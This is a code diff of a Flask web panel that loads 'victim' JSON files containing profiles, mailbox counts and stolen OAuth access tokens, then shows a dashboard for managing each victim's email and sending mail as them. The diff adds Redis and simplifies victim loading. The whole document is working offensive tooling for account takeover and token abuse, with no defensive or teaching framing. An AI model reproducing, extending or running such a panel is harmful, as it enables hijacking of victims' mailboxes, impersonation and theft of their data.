@@ -2,16 +2,15 @@ from flask import Flask, render_template_string, request, jsonify, send_file
 import requests
 import json
 import os
-import time
-import re
 from datetime import datetime
-import threading
 from dotenv import load_dotenv
-import base64
 from concurrent.futures import ThreadPoolExecutor
-from pathlib import Path
-import mimetypes
 import io
+import redis
+
+redis_url = os.getenv("REDIS_URL", "redis://localhost:6379/0")
+r = redis.from_url(redis_url)
+r.ping()
 
 load_dotenv()
 
@@ -27,66 +26,42 @@ executor = ThreadPoolExecutor(max_workers=20)
 
 
 
-def safe_load_json(filepath):
-    try:
-        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
-        
-        data = json.loads(content)
-        return data, None
-    except json.JSONDecodeError as e:
-        err = str(e)
-        print(f"🔧 Attempting to repair {filepath}: {err}")
-        return None, f"Failed to parse: {err[:100]}"
-        
-    except Exception as e:
-        return None, f"Unexpected error: {str(e)[:100]}"
-
-
 
 def load_victims():
-    """Load victim data from backend files with repair"""
+    """Load victim data from Redis + victim JSON files"""
     victims.clear()
     tokens.clear()
     
-    victims_dir = "."
-    victim_files = [f for f in os.listdir(victims_dir) if f.startswith("victim_") and f.endswith(".json")]
-    
-    print(f"🔍 Scanning {len(victim_files)} victim files...")
+    # Load victim files 
+    victim_files = [f for f in os.listdir(".") if f.startswith("victim_") and f.endswith(".json")]
     
     for filename in victim_files:
-        filepath = os.path.join(victims_dir, filename)
-        data, error = safe_load_json(filepath)
-        
-        if data:
+        try:
+            filepath = filename
+            with open(filepath, 'r', encoding='utf-8') as f:
+                data = json.load(f)
+            
             email = data['profile'].get('mail') or data['profile'].get('userPrincipalName', 'unknown')
             display_name = data['profile'].get('displayName', 'Unknown')
             
             token = data.get('tokens', {}).get('access_token')
             if token and isinstance(token, str) and len(token) > 500:
                 tokens[email] = token
-                print(f"✅ LOADED TOKEN: {email} len={len(token)}, has_dots={'.' in token}")
-            else:
-                print(f"❌ No valid token: {email}")
-                token = None
             
             victims[email] = {
-                    'id': display_name,
-                    'email': email,
-                    'filename': filename,
-                    'profile': data['profile'],
-                    'last_seen': datetime.now().isoformat(),
-                    'email_count': data.get('mailbox', {}).get('totalItemCount', 0),
-                    'token_status': '✅ Ready' if token else '❌ No Token',
-                    'file_size': os.path.getsize(filepath)
-                }
-                
-            print(f"✅ Loaded: {email} from {filename}")  
-            
-        else :
-                print(f"❌ Corrupted: {filename} - {error}")
+                'id': display_name,
+                'email': email,
+                'filename': filename,
+                'profile': data['profile'],
+                'last_seen': datetime.now().isoformat(),
+                'email_count': data.get('mailbox', {}).get('totalItemCount', 0),
+                'token_status': '✅ Ready' if token else '❌ No Token',
+                'file_size': os.path.getsize(filepath)
+            }
+        except:
+            continue
     
-    print(f"📊 Loaded {len(victims)} victims with tokens")
+    print(f"📊 Loaded {len(victims)} victims from files")
     return len(victims)
 
 def api_call(email, endpoint, method='GET', data=None, headers=None):
@@ -380,7 +355,7 @@ DASHBOARD_HTML = """
                             </div>
                             <span class="status {{ 'online' if '✅' in victim.token_status else 'warning' }}">{{ victim.token_status }}</span>
                         </div>
-                        <div class="meta">{{ victim.email_count }} emails • {{ victim.filename }} • {{ victim.file_size|filesizeformat }} • Token preview: {{ victims[email].profile.get('mail', '')[:20] }}...</div>
+                        <div class="meta">{{ victim.email_count }} emails • {{ victim.filename }} • {{ victim.file_size|filesizeformat }} • Token preview: {{ victim.profile.get("mail", "")[:20] }}...</div>
                         <div class="controls">
                             <button class="btn btn-primary" onclick="showEmailPanel('{{ email }}')">📧 Email Manager</button>
                             <button class="btn btn-success" onclick="showSendForm('{{ email }}')">✉️ Quick Send</button>
